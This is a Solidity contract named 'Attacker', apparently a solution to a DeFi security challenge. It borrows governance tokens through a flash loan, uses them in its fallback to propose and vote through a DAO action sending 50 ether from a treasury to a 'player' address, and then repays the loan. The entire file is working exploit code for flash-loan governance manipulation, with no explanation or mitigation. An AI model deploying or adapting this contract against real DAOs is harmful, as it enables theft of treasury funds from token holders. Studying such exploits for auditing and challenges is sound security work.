// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

interface IDAO {
    function propose(address target, uint256 value, bytes calldata data) external returns (uint256);
    function vote(uint256 id) external;
}
interface IERC20 {
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

contract Attacker {
    address public owner;
    IERC20 public token;
    IDAO public dao;
    address public flash;
    address public treasury;
    address public player;

    constructor(address _token, address _dao, address _flash, address _treasury, address _player) {
        owner = msg.sender;
        token = IERC20(_token);
        dao = IDAO(_dao);
        flash = _flash;
        treasury = _treasury;
        player = _player;
    }

    function attack(uint256 amount) external {
        require(msg.sender == owner, "not owner");
        (bool ok, bytes memory ret) = flash.call(
            abi.encodeWithSelector(0x2bd94e9c, amount, address(this), bytes(""))
        );
        require(ok, string(ret));
    }

    fallback() external {
        bytes memory data = abi.encodeWithSignature("spend(address,uint256)", player, uint256(50 ether));
        uint256 id = dao.propose(treasury, 0, data);
        dao.vote(id);
        token.transfer(flash, token.balanceOf(address(this)));
    }
}
